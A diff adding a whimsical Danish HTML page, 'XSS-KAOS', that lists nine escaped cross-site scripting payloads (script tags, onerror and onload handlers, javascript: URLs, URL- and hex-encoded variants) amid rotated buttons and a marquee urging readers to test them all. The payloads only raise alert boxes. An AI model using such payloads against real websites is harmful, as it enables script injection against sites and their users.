@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTIMATIVT XSS-KAOS!</title>
+    <link rel="stylesheet" href="just-use-xss-for-all-occasions.css">
+</head>
+<body>
+    <div class="xss-chaos-container">
+        <h1 class="chaos-title">XSS-KAOS TIL DET EKSTREME!</h1>
+        <p class="chaos-text">Liste over XSS-payloads og kodninger – utroligt kaotisk og forstyrrende! Klar til at teste grænserne:</p>
+
+        <!-- Випадкові пейлоади для XSS на данській -->
+        <ul class="xss-payloads">
+            <li>&lt;script&gt;alert(‘XSS’)&lt;/script&gt;</li>
+            <li>&lt;img src=x onerror=alert(‘Kaos’)&gt;</li>
+            <li>&lt;iframe src=”javascript:alert(‘Hacker’);”&gt;&lt;/iframe&gt;</li>
+            <li>%3Cscript%3Ealert%28123%29%3C%2Fscript%3E</li>
+            <li>&lt;div style="width: expression(alert('Hack!'));"&gt;</li>
+            <li>&lt;svg onload=alert("Malware")&gt;</li>
+            <li>&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert('Danmark!')&#x3C;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;</li>
+            <li>&lt;video src="x" onerror="alert('Chaos!')"&gt;</li>
+            <li>&lt;img src="javascript:alert('Kom igen!')"&gt;</li>
+        </ul>
+
+        <!-- Кнопки для ще більшого хаосу -->
+        <button class="chaos-button" style="position: absolute; top: 10%; left: 20%; transform: rotate(-15deg);">Klik Her!</button>
+        <button class="chaos-button" style="position: absolute; top: 50%; left: 75%; transform: rotate(25deg);">Mere Kaos</button>
+        <button class="chaos-button" style="position: absolute; top: 80%; left: 5%; transform: rotate(-30deg);">Fuldstændig Anarki!</button>
+
+        <marquee class="marquee-text">!!! KÆMPE KAOS !!! FLERE XSS-PAYLOADS – TEST DEM ALLE !!!</marquee>
+
+        <!-- Випадкові анімації -->
+        <div class="spinning-square">KAOS!</div>
+        <div class="flipping-text">Kode og Payloads Uden Stop!</div>
+    </div>
+</body>
+</html>
